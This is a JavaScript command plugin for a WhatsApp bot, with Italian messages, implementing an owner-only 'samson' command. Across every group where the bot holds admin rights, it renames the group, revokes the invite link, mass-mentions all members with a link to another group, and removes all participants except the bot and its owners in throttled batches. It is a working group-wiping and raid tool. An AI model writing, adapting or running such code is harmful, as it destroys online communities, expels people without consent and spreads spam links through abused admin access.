const delay = ms => new Promise(resolve => setTimeout(resolve, ms));

let handler = async (m, { conn, isOwner }) => {
    if (!isOwner) return;

    await m.reply("『 ☢️ 』 *𝐒𝐀𝐌𝐒𝐎𝐍 𝐎𝐏𝐓𝐈𝐎𝐍: 𝐈𝐧𝐢𝐳𝐢𝐚𝐥𝐢𝐳𝐳𝐚𝐳𝐢𝐨𝐧𝐞...*");

    const botId = conn.user.id.split(':')[0] + '@s.whatsapp.net';
    const ownerJids = global.owner.map(o => o[0] + '@s.whatsapp.net');

    let groups;
    try {
        groups = await conn.groupFetchAllParticipating();
    } catch (e) {
        return m.reply("『 ❌ 』 Errore di sistema.");
    }

    let wipedGroups = 0;

    for (let jid in groups) {
        try {
            let group = groups[jid];
            let participants = group.participants;

            let botObj = participants.find(p => (p.id || p.jid) === botId);
            let isBotAdmin = botObj && (botObj.admin === 'admin' || botObj.admin === 'superadmin');

            if (!isBotAdmin) continue;

            await conn.groupUpdateSubject(jid, `Sᴀᴍsᴏɴ ᴏᴘᴛɪᴏɴ: Tʜᴇ ʟᴀsᴛ ʀᴇsᴏʀᴛ.`).catch(() => {});
            await delay(800);

            await conn.groupRevokeInvite(jid).catch(() => {});

            let allJids = participants.map(p => p.id || p.jid);
            let usersToRemove = allJids.filter(id => id !== botId && !ownerJids.includes(id));

            if (usersToRemove.length > 0) {
                let msg = `
✦ ⁺ . ⁺ ✦ ⁺ . ⁺ ✦ ⁺ . ⁺ ✦
·  𝐁 𝐋 𝐃  -  𝐁 𝐎 𝐓  ·
✦ ⁺ . ⁺ ✦ ⁺ . ⁺ ✦ ⁺ . ⁺ ✦

『 🥀 』 *𝐒𝐀𝐌𝐒𝐎𝐍 𝐎𝐏𝐓𝐈𝐎𝐍*
_The Last Resort._

➤ https://chat.whatsapp.com/FeR5d1okEdQDa1qhwgp3JP?mode=gi_t
`.trim();

                await conn.sendMessage(jid, { text: msg, mentions: allJids });
                await delay(1500);

                const chunkSize = 5;
                for (let i = 0; i < usersToRemove.length; i += chunkSize) {
                    const chunk = usersToRemove.slice(i, i + chunkSize);
                    await conn.groupParticipantsUpdate(jid, chunk, 'remove').catch(() => {});
                    await delay(1500);
                }
                
                wipedGroups++;
            }

        } catch (e) {
            console.error(`Errore su ${jid}:`, e);
        }
    }

    m.reply(`『 ☢️ 』 *𝐓𝐇𝐄 𝐄𝐍𝐃*\nEpurazione completata su ${wipedGroups} gruppi.`);
};

handler.help = ['samson'];
handler.tags = ['owner'];
handler.command = /^(samson)$/i;
handler.owner = true;

export default handler;
